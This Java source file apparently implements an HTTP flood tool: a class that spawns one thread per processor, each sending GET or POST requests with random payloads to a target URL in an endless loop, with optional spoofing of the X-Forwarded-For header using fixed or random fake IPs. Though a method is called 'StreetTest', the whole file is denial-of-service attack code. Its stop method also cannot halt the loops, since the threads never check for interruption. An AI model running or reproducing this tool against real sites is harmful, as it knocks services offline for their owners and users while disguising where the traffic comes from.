package vip.mayikt;


import java.io.IOException;
import java.lang.annotation.Target;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.Arrays;
import java.util.Random;
import java.net.*;
//😡
public class YuShengJun {
    public HTTP RequestMode = HTTP.GET;
    public FakeIPMode FakeIPmode = FakeIPMode.Default;
    public int ThreadNum = Runtime.getRuntime().availableProcessors();
    public String TargetIP;
    public int port = 80;
    public String FakeIP = "127.0.0.1";
    public Thread[] threads;
    public int size;
    public enum HTTP
    {
        GET,
        POST;
    }
    public enum FakeIPMode
    {

        Random,
        Fixed,
        Default;
    }
    public byte[] GenerateRandomData()
    {
        Random random = new Random();
        byte[] data = new byte[size*1024];
        for(int i = 0;i < size*1024;i++)
        {
            data[i] = (byte)random.nextInt(256);
        }
        return data;
    }
    public String GenerateRandomIP()
    {
        Random random = new Random();
        int[] ip = new int[4];
        for(int i = 0;i < 4;i++)
        {
            ip[i] = (byte)random.nextInt(256);
        }
        return ip[0] + "." + ip[1] + "." + ip[2] + "." + ip[3];
    }
    public String GetIP(String URL)
    {
        try
        {
            URL url = new URL("http://"+URL);
            InetAddress address = InetAddress.getByName(url.getHost());
            return "http://"+address.getHostAddress();
        }
        catch(Exception e)
        {
            e.printStackTrace();
            return null;
        }
    }
    public void StreetTest()
    {
        try
        {
            threads = new Thread[ThreadNum];
            HttpRequest httpRequest = null;
            switch(RequestMode)
            {
                case GET ->
                {
                    switch (FakeIPmode)
                    {
                        case Fixed ->
                        {
                            httpRequest = HttpRequest.newBuilder(new URI(TargetIP)).GET().header("X-Forwarded-For", FakeIP).build();
                        }
                        case Random ->
                        {
                            httpRequest = HttpRequest.newBuilder(new URI(TargetIP)).GET().header("X-Forwarded-For", GenerateRandomIP()).build();
                        }
                        case Default ->
                        {
                            httpRequest = HttpRequest.newBuilder().GET().build();
                        }
                    }
                }
                case POST ->
                {
                    switch (FakeIPmode)
                    {
                        case Fixed ->
                        {
                            httpRequest = HttpRequest.newBuilder(new URI(TargetIP)).POST(HttpRequest.BodyPublishers.ofByteArray(GenerateRandomData())).header("X-Forwarded-For", FakeIP).build();
                        }
                        case Random ->
                        {
                            httpRequest = HttpRequest.newBuilder(new URI(TargetIP)).POST(HttpRequest.BodyPublishers.ofByteArray(GenerateRandomData())).header("X-Forwarded-For", GenerateRandomIP()).build();
                        }
                        case Default ->
                        {
                            httpRequest = HttpRequest.newBuilder(new URI(TargetIP)).POST(HttpRequest.BodyPublishers.ofByteArray(GenerateRandomData())).build();
                        }
                    }
                }
            }
            HttpClient httpClient = HttpClient.newHttpClient();
            for(int i = 0;i < ThreadNum;i++)
            {
                HttpRequest finalHttpRequest = httpRequest;
                threads[i] = new Thread(() -> {

                        while(true)
                        {
                            try {
                                httpClient.sendAsync(finalHttpRequest, HttpResponse.BodyHandlers.discarding());
                                System.out.println("[+]Sent Request");
                            } catch (Exception e) {
                                System.err.println("[-]"+e.getMessage());
                            }
                        }
                });
                threads[i].start();
            }
        }
        catch(Exception e)
        {
            e.printStackTrace();
        }
    }
    public void Stop()
    {
        for(int i = 0;i < ThreadNum;i++)
        {
            threads[i].interrupt();
        }
    }
}
